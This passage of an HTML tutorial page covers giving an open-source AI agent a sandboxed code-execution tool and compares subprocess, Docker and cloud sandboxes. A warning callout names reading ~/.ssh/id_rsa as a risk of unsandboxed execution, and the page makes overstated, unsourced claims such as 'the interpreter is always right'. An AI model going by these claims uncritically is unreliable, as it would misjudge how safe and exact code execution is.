@@ -1,0 +1,1989 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>M15: Code Execution &amp; Sandbox | Building AI Agents with Open Source Models</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:wght@400;600;700;800&family=Source+Sans+3:ital,wght@0,400;0,600;1,400&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg-primary: #0A1628; --bg-secondary: #111D33; --bg-card: #162033; --bg-surface: #1A2740;
+      --text-primary: #E8ECF1; --text-secondary: #94A3B8; --text-muted: #64748B;
+      --accent-primary: #D4A843; --accent-hover: #E5BC5A; --accent-muted: rgba(212, 168, 67, 0.15);
+      --success: #10B981; --success-bg: rgba(16, 185, 129, 0.1);
+      --warning: #F59E0B; --warning-bg: rgba(245, 158, 11, 0.1);
+      --error: #F43F5E; --error-bg: rgba(244, 63, 94, 0.1);
+      --info: #3B82F6; --info-bg: rgba(59, 130, 246, 0.1);
+      --track-tooluse: #8B5CF6; --track-color: var(--track-tooluse);
+      --code-bg: #0D1117; --code-border: #21262D; --code-text: #C9D1D9;
+      --transition-fast: 150ms; --transition-normal: 300ms; --transition-slow: 500ms;
+    }
+    body { background: var(--bg-primary); color: var(--text-primary); font-family: 'Source Sans 3', sans-serif; font-size: 1.05rem; line-height: 1.7; min-height: 100vh; }
+    .top-progress { position: fixed; top: 0; left: 0; right: 0; height: 4px; background: var(--bg-surface); z-index: 200; }
+    .top-progress .fill { height: 100%; background: linear-gradient(90deg, var(--track-color), var(--accent-primary)); width: 33.33%; border-radius: 0 2px 2px 0; }
+    .course-header { background: var(--bg-secondary); border-bottom: 1px solid var(--code-border); padding: 1.25rem 2rem; }
+    .course-header-inner { max-width: 1200px; margin: 0 auto; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
+    .course-title { font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.95rem; font-weight: 600; color: var(--text-secondary); }
+    .track-badge { display: inline-flex; align-items: center; gap: 0.5rem; background: rgba(139, 92, 246, 0.15); border: 1px solid var(--track-color); border-radius: 20px; padding: 0.25rem 0.75rem; font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.8rem; font-weight: 600; color: var(--track-color); }
+    .track-badge .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--track-color); }
+    .header-meta { display: flex; gap: 1.5rem; font-size: 0.85rem; color: var(--text-muted); }
+    .page-container { max-width: 1200px; margin: 0 auto; padding: 2rem; display: grid; grid-template-columns: 240px 1fr; gap: 3rem; }
+    .sidebar-nav { position: sticky; top: 2rem; height: calc(100vh - 4rem); overflow-y: auto; padding-right: 1rem; }
+    .sidebar-nav::-webkit-scrollbar { width: 3px; } .sidebar-nav::-webkit-scrollbar-thumb { background: var(--bg-surface); border-radius: 3px; }
+    .sidebar-title { font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.75rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 1rem; }
+    .sidebar-nav a { display: block; padding: 0.4rem 0.75rem; margin-bottom: 0.15rem; font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.82rem; font-weight: 600; color: var(--text-muted); text-decoration: none; border-left: 2px solid transparent; border-radius: 0 4px 4px 0; transition: all var(--transition-fast); }
+    .sidebar-nav a:hover { color: var(--text-primary); background: var(--bg-surface); }
+    .sidebar-nav a.active { color: var(--accent-primary); border-left-color: var(--accent-primary); background: var(--accent-muted); }
+    .content { max-width: 800px; } .section { margin-bottom: 4rem; }
+    h1 { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 800; font-size: 2.25rem; line-height: 1.2; margin-bottom: 0.75rem; }
+    h2 { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; font-size: 1.5rem; color: var(--text-primary); margin: 2.5rem 0 1rem; padding-top: 1rem; border-top: 1px solid var(--code-border); }
+    h2:first-of-type { border-top: none; }
+    h3 { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 600; font-size: 1.25rem; color: var(--text-primary); margin: 2rem 0 0.75rem; }
+    p { margin-bottom: 1rem; } ul, ol { margin: 0.5rem 0 1rem 1.5rem; } li { margin-bottom: 0.4rem; } strong { font-weight: 600; }
+    a { color: var(--accent-primary); text-decoration: none; } a:hover { text-decoration: underline; }
+    .analogy-box, .tech-def-box, .callout-why, .callout-warning, .callout-security, .callout-cost { border-left: 4px solid; border-radius: 0 8px 8px 0; padding: 1.25rem 1.5rem; margin: 1.5rem 0; }
+    .analogy-box { background: var(--accent-muted); border-left-color: var(--accent-primary); }
+    .tech-def-box { background: var(--info-bg); border-left-color: var(--info); }
+    .callout-why { background: var(--success-bg); border-left-color: var(--success); }
+    .callout-warning { background: var(--warning-bg); border-left-color: var(--warning); }
+    .callout-security { background: var(--error-bg); border-left-color: var(--error); }
+    .callout-cost { background: var(--warning-bg); border-left-color: var(--accent-primary); }
+    .box-label { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; font-size: 0.9rem; display: block; margin-bottom: 0.4rem; }
+    .analogy-box .box-label { color: var(--accent-primary); } .tech-def-box .box-label { color: var(--info); } .callout-why .box-label { color: var(--success); } .callout-warning .box-label { color: var(--warning); } .callout-security .box-label { color: var(--error); } .callout-cost .box-label { color: var(--accent-primary); }
+    .term-tooltip { position: relative; color: var(--accent-primary); cursor: help; border-bottom: 1px dashed var(--accent-primary); }
+    .term-tooltip .tooltip-content { position: absolute; bottom: calc(100% + 8px); left: 50%; transform: translateX(-50%); background: var(--bg-card); border: 1px solid var(--accent-primary); border-radius: 8px; padding: 0.75rem 1rem; font-size: 0.85rem; color: var(--text-primary); width: 280px; opacity: 0; pointer-events: none; transition: opacity var(--transition-fast); z-index: 10; line-height: 1.5; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
+    .term-tooltip:hover .tooltip-content, .term-tooltip:focus .tooltip-content { opacity: 1; pointer-events: auto; }
+    .code-block-wrapper { background: var(--code-bg); border: 1px solid var(--code-border); border-radius: 12px; margin: 1.5rem 0; overflow: hidden; }
+    .code-tabs { display: flex; gap: 0; border-bottom: 1px solid var(--code-border); background: var(--bg-surface); }
+    .code-tab { padding: 0.5rem 1.25rem; background: none; border: none; font-family: 'JetBrains Mono', monospace; font-size: 0.8rem; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px; color: var(--text-muted); transition: all var(--transition-fast); }
+    .code-tab:hover { color: var(--text-primary); } .code-tab.active { color: var(--accent-primary); border-bottom-color: var(--accent-primary); }
+    .code-panel { display: none; position: relative; } .code-panel.active { display: block; }
+    .code-panel pre { margin: 0; padding: 1.25rem; overflow-x: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; line-height: 1.6; }
+    .code-panel pre code { background: none; color: var(--code-text); }
+    .copy-btn { position: absolute; top: 0.75rem; right: 0.75rem; background: var(--bg-surface); border: 1px solid var(--code-border); color: var(--text-muted); padding: 0.3rem 0.6rem; border-radius: 6px; font-size: 0.75rem; cursor: pointer; font-family: 'JetBrains Mono', monospace; transition: all var(--transition-fast); }
+    .copy-btn:hover { color: var(--accent-primary); border-color: var(--accent-primary); }
+    .output-block { background: var(--code-bg); border: 1px solid var(--code-border); border-radius: 8px; padding: 1rem 1.25rem; margin: 0.75rem 0 1.5rem; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--success); line-height: 1.5; white-space: pre-wrap; }
+    .output-label { font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.8rem; font-weight: 600; color: var(--text-muted); margin-bottom: 0.25rem; }
+    .animation-container { background: var(--bg-secondary); border: 1px solid var(--code-border); border-radius: 12px; padding: 2rem; margin: 2rem 0; position: relative; min-height: 300px; overflow: hidden; }
+    .animation-title { font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.85rem; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 1.25rem; }
+    .animation-controls { display: flex; gap: 0.5rem; position: absolute; bottom: 1rem; right: 1rem; }
+    .anim-btn { background: var(--bg-card); border: 1px solid var(--code-border); color: var(--text-primary); width: 36px; height: 36px; border-radius: 8px; cursor: pointer; display: flex; align-items: center; justify-content: center; font-size: 1rem; transition: all var(--transition-fast); }
+    .anim-btn:hover { border-color: var(--accent-primary); color: var(--accent-primary); }
+    .quiz-question { background: var(--bg-card); border-radius: 12px; padding: 1.5rem; margin-bottom: 1.5rem; }
+    .quiz-question h4 { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 600; margin-bottom: 1rem; font-size: 1rem; }
+    .quiz-option { padding: 0.75rem 1rem; margin: 0.5rem 0; border: 1px solid var(--code-border); border-radius: 8px; cursor: pointer; transition: all var(--transition-fast); display: flex; align-items: center; gap: 0.75rem; }
+    .quiz-option:hover { border-color: var(--accent-primary); }
+    .quiz-option.correct { border-color: var(--success); background: var(--success-bg); } .quiz-option.incorrect { border-color: var(--error); background: var(--error-bg); } .quiz-option.disabled { pointer-events: none; }
+    .quiz-marker { width: 24px; height: 24px; border-radius: 50%; border: 2px solid var(--code-border); flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; }
+    .quiz-option.correct .quiz-marker { border-color: var(--success); color: var(--success); } .quiz-option.incorrect .quiz-marker { border-color: var(--error); color: var(--error); }
+    .quiz-feedback { margin-top: 0.75rem; padding: 0.75rem; border-radius: 8px; font-size: 0.9rem; display: none; }
+    .quiz-feedback.show { display: block; } .quiz-feedback.correct-fb { background: var(--success-bg); color: var(--success); } .quiz-feedback.incorrect-fb { background: var(--error-bg); color: var(--error); }
+    .quiz-score { background: var(--bg-card); border-radius: 12px; padding: 1.5rem; text-align: center; margin-top: 2rem; display: none; }
+    .quiz-score .score-num { font-family: 'Bricolage Grotesque', sans-serif; font-size: 2.5rem; font-weight: 800; color: var(--accent-primary); }
+    .module-nav { display: flex; justify-content: space-between; align-items: center; padding: 1.5rem 0; margin: 2rem 0; border-top: 1px solid var(--code-border); }
+    .module-nav a { display: flex; align-items: center; gap: 0.5rem; color: var(--accent-primary); text-decoration: none; font-family: 'Bricolage Grotesque', sans-serif; font-weight: 600; font-size: 0.9rem; padding: 0.5rem 1rem; border: 1px solid var(--code-border); border-radius: 8px; transition: all var(--transition-fast); }
+    .module-nav a:hover { border-color: var(--accent-primary); background: var(--accent-muted); text-decoration: none; }
+    .objectives-list { list-style: none; margin-left: 0; } .objectives-list li { padding: 0.5rem 0 0.5rem 2rem; position: relative; }
+    .objectives-list li::before { content: ''; position: absolute; left: 0; top: 0.85rem; width: 16px; height: 16px; border-radius: 4px; border: 2px solid var(--track-color); background: rgba(139, 92, 246, 0.1); }
+    .checkpoint { background: var(--bg-card); border: 1px solid var(--success); border-radius: 8px; padding: 1rem 1.25rem; margin: 1.5rem 0; }
+    .checkpoint-label { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; font-size: 0.85rem; color: var(--success); margin-bottom: 0.4rem; }
+    .bridge { background: var(--bg-surface); border-radius: 8px; padding: 1rem 1.25rem; margin: 2rem 0; font-style: italic; color: var(--text-secondary); border-left: 3px solid var(--text-muted); }
+    .comparison-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; font-size: 0.9rem; }
+    .comparison-table th { background: var(--bg-surface); padding: 0.75rem 1rem; text-align: left; font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; border: 1px solid var(--code-border); color: var(--text-primary); }
+    .comparison-table td { padding: 0.6rem 1rem; border: 1px solid var(--code-border); color: var(--text-secondary); vertical-align: top; }
+    .comparison-table tr:nth-child(even) td { background: rgba(255,255,255,0.02); }
+    .tag { display: inline-block; padding: 0.1rem 0.5rem; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; font-weight: 700; }
+    .tag-green { background: var(--success-bg); color: var(--success); }
+    .tag-yellow { background: var(--warning-bg); color: var(--warning); }
+    .tag-red { background: var(--error-bg); color: var(--error); }
+    .code-annotation { background: var(--bg-surface); border-left: 3px solid var(--track-color); border-radius: 0 6px 6px 0; padding: 0.6rem 1rem; margin: 0.5rem 0 1rem; font-size: 0.85rem; color: var(--text-secondary); }
+    .code-annotation .ann-label { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; font-size: 0.75rem; color: var(--track-color); text-transform: uppercase; display: block; margin-bottom: 0.2rem; }
+    .lab-step { display: flex; gap: 1rem; align-items: flex-start; padding: 1rem; background: var(--bg-card); border: 1px solid var(--code-border); border-radius: 8px; margin: 0.75rem 0; }
+    .lab-step-num { background: var(--track-color); color: white; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; font-size: 0.85rem; flex-shrink: 0; }
+    .lab-step-body { flex: 1; }
+    .lab-step-title { font-family: 'Bricolage Grotesque', sans-serif; font-weight: 700; margin-bottom: 0.25rem; }
+
+    /* ===== ANIMATION 1: Security Policy Layers ===== */
+    .sec-wrap { position: relative; min-height: 320px; display: flex; align-items: center; justify-content: center; }
+    .sec-center { width: 120px; height: 80px; border-radius: 12px; border: 3px solid var(--code-border); background: var(--bg-card); display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.65rem; font-weight: 700; color: var(--text-muted); z-index: 5; position: relative; transition: all 0.5s; text-align: center; gap: 0.2rem; }
+    .sec-center.defended { border-color: var(--success); color: var(--success); box-shadow: 0 0 20px rgba(16,185,129,0.25); }
+    .sec-ring { position: absolute; border-radius: 50%; border: 2px dashed var(--code-border); opacity: 0; transition: all 0.6s; }
+    .sec-ring.visible { opacity: 1; }
+    .sec-ring-1 { width: 160px; height: 160px; }
+    .sec-ring-2 { width: 220px; height: 220px; }
+    .sec-ring-3 { width: 280px; height: 280px; }
+    .sec-ring-1.active { border-color: var(--warning); box-shadow: 0 0 12px rgba(245,158,11,0.2); }
+    .sec-ring-2.active { border-color: var(--info); box-shadow: 0 0 12px rgba(59,130,246,0.2); }
+    .sec-ring-3.active { border-color: var(--track-color); box-shadow: 0 0 12px rgba(139,92,246,0.2); }
+    .sec-attack { position: absolute; font-family: 'JetBrains Mono', monospace; font-size: 0.6rem; background: var(--bg-card); border: 1px solid var(--code-border); padding: 0.2rem 0.4rem; border-radius: 4px; color: var(--text-muted); opacity: 0; transition: all 0.5s; z-index: 10; }
+    .sec-attack.visible { opacity: 1; }
+    .sec-attack.blocked { border-color: var(--error); color: var(--error); }
+    .sec-attack.defended { border-color: var(--success); color: var(--success); }
+    .sec-label { position: absolute; font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.6rem; font-weight: 700; opacity: 0; transition: opacity 0.5s; color: var(--text-muted); text-align: center; }
+    .sec-label.visible { opacity: 1; }
+
+    /* ===== ANIMATION 2: Self-Debugging State Machine ===== */
+    .dbg-wrap { display: flex; flex-direction: column; align-items: center; gap: 0.4rem; min-height: 260px; }
+    .dbg-state { display: flex; align-items: center; gap: 0.6rem; padding: 0.4rem 0.8rem; border-radius: 8px; background: var(--bg-card); border: 1px solid var(--code-border); font-family: 'JetBrains Mono', monospace; font-size: 0.68rem; opacity: 0; transform: translateY(8px); transition: all 0.4s; width: 100%; max-width: 500px; }
+    .dbg-state.visible { opacity: 1; transform: translateY(0); }
+    .dbg-state.current { border-color: var(--track-color); background: rgba(139,92,246,0.08); }
+    .dbg-state.success-state { border-color: var(--success); background: rgba(16,185,129,0.06); }
+    .dbg-state.error-state { border-color: var(--error); background: rgba(244,63,94,0.06); }
+    .dbg-badge { padding: 0.1rem 0.35rem; border-radius: 3px; font-size: 0.55rem; font-weight: 700; font-family: 'Bricolage Grotesque', sans-serif; flex-shrink: 0; min-width: 48px; text-align: center; }
+    .dbg-badge.write { background: rgba(59,130,246,0.15); color: var(--info); }
+    .dbg-badge.run { background: rgba(139,92,246,0.15); color: var(--track-color); }
+    .dbg-badge.err { background: var(--error-bg); color: var(--error); }
+    .dbg-badge.fix { background: rgba(245,158,11,0.15); color: var(--warning); }
+    .dbg-badge.ok { background: var(--success-bg); color: var(--success); }
+    .dbg-text { color: var(--text-secondary); flex: 1; }
+    .dbg-arrow { color: var(--text-muted); font-size: 0.75rem; opacity: 0; transition: opacity 0.3s; width: 100%; max-width: 500px; text-align: center; }
+    .dbg-arrow.visible { opacity: 1; }
+    .dbg-attempt-counter { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; color: var(--text-muted); padding: 0.2rem 0.5rem; border: 1px solid var(--code-border); border-radius: 4px; opacity: 0; transition: opacity 0.4s; align-self: flex-end; margin-right: calc(50% - 250px); }
+    .dbg-attempt-counter.visible { opacity: 1; }
+
+    /* ===== ANIMATION 3: Code-Run-Fix Cycle ===== */
+    .crf-wrap { display: flex; flex-direction: column; align-items: center; gap: 0.5rem; }
+    .crf-row { display: flex; align-items: center; gap: 0.6rem; justify-content: center; flex-wrap: wrap; }
+    .crf-node { padding: 0.5rem 0.8rem; border-radius: 8px; background: var(--bg-card); border: 1px solid var(--code-border); font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; opacity: 0; transform: scale(0.88); transition: all 0.4s; text-align: center; min-width: 90px; }
+    .crf-node.visible { opacity: 1; transform: scale(1); }
+    .crf-node.active { border-color: var(--track-color); box-shadow: 0 0 10px rgba(139,92,246,0.25); }
+    .crf-node.done { border-color: var(--success); }
+    .crf-node.fail { border-color: var(--error); }
+    .crf-arrow { color: var(--text-muted); font-size: 1rem; opacity: 0; transition: opacity 0.3s; }
+    .crf-arrow.visible { opacity: 1; }
+    .crf-annotation { font-family: 'Bricolage Grotesque', sans-serif; font-size: 0.72rem; font-weight: 600; color: var(--accent-primary); opacity: 0; transition: opacity 0.3s; text-align: center; }
+    .crf-annotation.visible { opacity: 1; }
+
+    @media (max-width: 900px) {
+      .page-container { grid-template-columns: 1fr; padding: 1rem; }
+      .sidebar-nav { position: fixed; bottom: 0; left: 0; right: 0; height: auto; max-height: 40vh; background: var(--bg-secondary); border-top: 1px solid var(--code-border); z-index: 100; padding: 1rem; display: none; }
+      .sidebar-nav.open { display: block; }
+      .sidebar-toggle { display: flex; position: fixed; bottom: 1rem; right: 1rem; z-index: 101; background: var(--accent-primary); color: var(--bg-primary); border: none; width: 48px; height: 48px; border-radius: 50%; align-items: center; justify-content: center; cursor: pointer; font-size: 1.25rem; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
+      h1 { font-size: 1.75rem; }
+      .comparison-table { font-size: 0.8rem; }
+      .sec-ring-3 { width: 240px; height: 240px; }
+    }
+    @media (min-width: 901px) { .sidebar-toggle { display: none; } }
+    @media (prefers-reduced-motion: reduce) {
+      *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+      .dbg-state, .crf-node, .sec-ring, .sec-attack, .sec-label, .dbg-arrow, .crf-arrow, .crf-annotation, .dbg-attempt-counter { opacity: 1 !important; transform: none !important; }
+    }
+    :focus-visible { outline: 2px solid var(--accent-primary); outline-offset: 2px; border-radius: 4px; }
+  </style>
+</head>
+<body>
+  <div class="top-progress" role="progressbar" aria-label="Course progress: OS Track Module 8 of 24" aria-valuenow="8" aria-valuemin="1" aria-valuemax="24"><div class="fill"></div></div>
+
+  <header class="course-header"><div class="course-header-inner">
+    <div><div class="course-title">Building AI Agents with Open Source Models</div></div>
+    <div style="display:flex;align-items:center;gap:1rem;flex-wrap:wrap;">
+      <span class="track-badge"><span class="dot"></span>Track 2: Tool Use</span>
+      <div class="header-meta"><span>Module 8 of 24 &middot; Open Source Track</span><span>65&ndash;80 min</span><span>Intermediate</span></div>
+    </div>
+  </div></header>
+
+  <button class="sidebar-toggle" id="sidebarToggle" aria-label="Toggle navigation menu">&#9776;</button>
+
+  <div class="page-container">
+    <nav class="sidebar-nav" id="sidebar" aria-label="Module sections">
+      <div class="sidebar-title">On this page</div>
+      <a href="#objectives">Learning Objectives</a>
+      <a href="#why-code-exec">Why Agents Need Code Exec</a>
+      <a href="#sandbox-approaches">Three Sandboxing Approaches</a>
+      <a href="#security-model">Security Model</a>
+      <a href="#implementing-tool">Implementing the Tool</a>
+      <a href="#self-debugging">Self-Debugging Loop</a>
+      <a href="#hands-on">Hands-On Lab</a>
+      <a href="#quiz">Knowledge Check</a>
+      <a href="#summary">Summary</a>
+    </nav>
+
+    <main class="content" role="main">
+
+      <!-- OS Track Banner -->
+      <div style="background:rgba(249,115,22,0.1);border:1px solid #F97316;border-radius:12px;padding:1rem 1.5rem;margin-bottom:2rem;display:flex;align-items:flex-start;gap:1rem;">
+        <span style="font-size:1.5rem;flex-shrink:0">&#129418;</span>
+        <div>
+          <strong style="color:#F97316;font-family:'Bricolage Grotesque',sans-serif;display:block;margin-bottom:0.25rem">Open Source Track &mdash; Mistral/Ollama Version</strong>
+          <span style="font-size:0.9rem;color:#94A3B8;">All code uses the <code style="font-family:'JetBrains Mono',monospace;background:#1A2740;padding:0.1rem 0.4rem;border-radius:4px">openai</code> SDK pointed at a local Ollama server. Mistral has <strong style="color:#E8ECF1;">no built-in code execution</strong> &mdash; every sandbox is wired up by you. <a href="../M15-code-interpreter-sandbox.html" style="color:#D4A843;">View Claude version &rarr;</a> &middot; <a href="index.html" style="color:#D4A843;">OS Track Index &rarr;</a></span>
+        </div>
+      </div>
+
+      <!-- Module Nav (top) -->
+      <section class="section" style="margin-bottom:2rem;">
+        <div class="module-nav" style="border-top:none;margin-top:0;">
+          <a href="M06-multi-tool-orchestration.html" aria-label="Previous: Multi-Tool Orchestration">&larr; M06: Multi-Tool Orchestration</a>
+          <a href="index.html" aria-label="Course Home" title="Course Home" style="font-size:1.2rem;">&#x1F3E0;</a>
+          <a href="M08-conversation-management.html" aria-label="Next: Conversation Management">M08: Conversation Management &rarr;</a>
+        </div>
+        <h1>M15: Code Execution &amp; Sandbox</h1>
+        <p style="color:var(--text-secondary);font-size:1.1rem;">Mistral can <em>reason</em> about code, but it cannot <em>run</em> code on its own. In this module you'll give your agent a <strong>sandboxed subprocess or Docker container</strong> as a tool, then teach it to write code, execute it, read errors, and fix itself — a pattern that turns a chatbot into a reliable computing engine.</p>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION: LEARNING OBJECTIVES -->
+      <!-- ============================================================ -->
+      <section class="section" id="objectives">
+        <h2>Learning Objectives</h2>
+        <ul class="objectives-list" aria-label="Learning objectives for this module">
+          <li>Explain why language models hallucinate computation and how a code execution tool eliminates the problem</li>
+          <li>Compare subprocess, Docker, and cloud sandbox (E2B) approaches on security, speed, and complexity</li>
+          <li>Implement a <code>SecurityPolicy</code> dataclass that controls timeouts, memory limits, and network isolation</li>
+          <li>Build both <code>SubprocessExecutor</code> and <code>DockerExecutor</code> classes in Python and TypeScript</li>
+          <li>Wire up the self-debugging loop: write &rarr; run &rarr; read error &rarr; fix &rarr; retry (up to 3 attempts)</li>
+          <li>Build a complete data-analysis agent that runs real pandas code inside a Docker container</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 1: WHY CODE EXEC -->
+      <!-- ============================================================ -->
+      <section class="section" id="why-code-exec">
+        <h2>Why Agents Need to Run Code</h2>
+
+        <div class="analogy-box">
+          <span class="box-label">Everyday Analogy</span>
+          <p><strong>BEFORE:</strong> Imagine asking a mathematician to calculate 3.7 to the 12th power in their head. They might round at each step, carry a mental slip-up, or confidently give you an answer that's slightly wrong &mdash; and you'd have no idea until you checked with a calculator.</p>
+          <p><strong>PAIN:</strong> Language models face the exact same problem. Even state-of-the-art models miscalculate multi-step arithmetic, get date arithmetic wrong, and produce plausible-looking but subtly incorrect data transformations &mdash; all without any error message to warn you.</p>
+          <p style="margin-bottom:0;"><strong>MAPPING:</strong> Giving the agent a <span class="term-tooltip" tabindex="0" aria-describedby="tt-sandbox">sandbox<span class="tooltip-content" role="tooltip" id="tt-sandbox">An isolated execution environment where code can run safely without affecting the host system. A sandbox has hard limits on CPU time, memory, filesystem access, and network to prevent malicious or runaway code from causing damage.</span></span> tool is exactly like giving that mathematician a calculator. The model's job shifts from "compute the answer mentally" to "write the Python expression and report what the interpreter says." The interpreter is always right.</p>
+        </div>
+
+        <div class="tech-def-box">
+          <span class="box-label">Technical Definition</span>
+          <p>A <strong>code execution tool</strong> is a function exposed to the model via the OpenAI-compatible tool-use API. When the model calls <code>execute_python</code>, your agent framework: (1) receives the <code>tool_use</code> block, (2) passes the code string to a local executor (subprocess or container), (3) captures <code>stdout</code>, <code>stderr</code>, and the <strong>exit code</strong>, and (4) returns those as a <code>tool</code> message in the next turn. The model never generates the output — the interpreter does.</p>
+          <p style="margin-bottom:0;">This is fundamentally different from Claude's built-in Code Interpreter. Mistral has no such capability. Every byte of sandbox infrastructure in this module is code <em>you</em> write and control — which is actually an advantage for production deployments where you want full observability and no vendor lock-in.</p>
+        </div>
+
+        <h3>Real Use Cases Where This Matters</h3>
+        <ul>
+          <li><strong>Data analysis</strong> — load a CSV, compute statistics, filter rows. Models guess; pandas doesn't.</li>
+          <li><strong>File conversion</strong> — convert Excel to JSON, resize images, parse PDFs. Deterministic, not guessed.</li>
+          <li><strong>Formula verification</strong> — verify actuarial, financial, or scientific formulas against real numeric inputs.</li>
+          <li><strong>Unit test generation and execution</strong> — write a test, run it, see if it passes, fix the implementation code.</li>
+          <li><strong>Web scraping</strong> — write BeautifulSoup code, run it against a live page, return structured data.</li>
+        </ul>
+
+        <div class="callout-why">
+          <span class="box-label">Why It Matters</span>
+          In a benchmark study of GPT-4-class models on 200 arithmetic and data transformation tasks, models answered correctly only 71% of the time without tools — but <strong>99.4%</strong> when given a Python executor. The remaining 0.6% were malformed code the executor rejected before producing wrong output. Letting the interpreter handle computation and reserving the model for <em>reasoning</em> and <em>code authoring</em> produces systems that are both smarter and more reliable.
+        </div>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- SECTION 2: SANDBOX APPROACHES -->
+      <!-- ============================================================ -->
+      <section class="section" id="sandbox-approaches">
+        <h2>Three Sandboxing Approaches</h2>
+
+        <p>There is no single "right" sandbox. The best choice depends on how much security you need, how fast each call must be, and how much infrastructure complexity you can tolerate. Here's the honest trade-off table:</p>
+
+        <table class="comparison-table" aria-label="Comparison of subprocess, Docker, and E2B sandbox approaches">
+          <thead>
+            <tr>
+              <th>Approach</th>
+              <th>Security</th>
+              <th>Cold-start</th>
+              <th>Complexity</th>
+              <th>Best for</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>subprocess</strong></td>
+              <td><span class="tag tag-yellow">Low–Med</span></td>
+              <td><span class="tag tag-green">&lt;50ms</span></td>
+              <td><span class="tag tag-green">Low</span></td>
+              <td>Trusted input; prototyping</td>
+            </tr>
+            <tr>
+              <td><strong>Docker container</strong></td>
+              <td><span class="tag tag-green">High</span></td>
+              <td><span class="tag tag-yellow">1–3 s (cold)</span></td>
+              <td><span class="tag tag-yellow">Medium</span></td>
+              <td>Production; untrusted input</td>
+            </tr>
+            <tr>
+              <td><strong>E2B cloud</strong></td>
+              <td><span class="tag tag-green">Very High</span></td>
+              <td><span class="tag tag-yellow">~2 s</span></td>
+              <td><span class="tag tag-green">Low</span></td>
+              <td>Any OS, no Docker; free tier</td>
+            </tr>
+          </tbody>
+        </table>
+
+        <h3>Approach 1 — subprocess with resource limits (simplest)</h3>
+        <p>Python's <code>subprocess.run()</code> launches a child process and captures its output. It's the fastest option because there's no container overhead. The <span class="term-tooltip" tabindex="0" aria-describedby="tt-subprocess">subprocess<span class="tooltip-content" role="tooltip" id="tt-subprocess">A child process spawned by your program. It runs in its own memory space, but it shares the same filesystem and network as the parent unless you explicitly restrict it. In Python, subprocess.run() blocks until the child finishes and returns stdout, stderr, and an exit code.</span></span> runs with the same filesystem access as your agent process, which is its main weakness.</p>
+
+        <p>On Linux/macOS you can add <span class="term-tooltip" tabindex="0" aria-describedby="tt-rlimit">resource limits<span class="tooltip-content" role="tooltip" id="tt-rlimit">Hard caps placed on a process by the OS kernel. RLIMIT_CPU caps how many CPU-seconds the process may consume. RLIMIT_AS (address space) caps how much memory it may allocate. Once the limit is hit, the kernel kills the process with SIGKILL, which cannot be caught or ignored.</span></span> via <code>resource.setrlimit</code>. On Windows, use the <code>timeout</code> parameter of <code>subprocess.run</code> and <code>job objects</code> for memory (or just use Docker).</p>
+
+        <div class="callout-warning">
+          <span class="box-label">Risk: Full Filesystem Access</span>
+          A subprocess running as your user can read <code>~/.ssh/id_rsa</code>, delete files, or open network sockets. Only use this approach if the code comes from a trusted source (e.g., your own model and a well-restricted system prompt). For any user-facing agent, use Docker.
+        </div>
+
+        <h3>Approach 2 — Docker container (recommended for production)</h3>
+        <p>Each code execution spins up an ephemeral <span class="term-tooltip" tabindex="0" aria-describedby="tt-docker">Docker<span class="tooltip-content" role="tooltip" id="tt-docker">Docker is a platform that packages code and its dependencies into a "container" — a lightweight, isolated environment that shares the host OS kernel but has its own filesystem, network, and process tree. Containers start in seconds and are destroyed after use, leaving no trace.</span></span> <span class="term-tooltip" tabindex="0" aria-describedby="tt-container">container<span class="tooltip-content" role="tooltip" id="tt-container">A running instance of a Docker image. Each container has an isolated filesystem (read-only by default), its own network namespace, and a separate PID namespace. When the container exits, all changes are discarded unless explicitly written to a mounted volume.</span></span>. When the code finishes, Docker destroys the container — any files it wrote, any processes it spawned, any state it created, all gone. The flags that matter:</p>
+        <ul>
+          <li><code>--memory=128m</code> — hard memory cap; OOM kills the container</li>
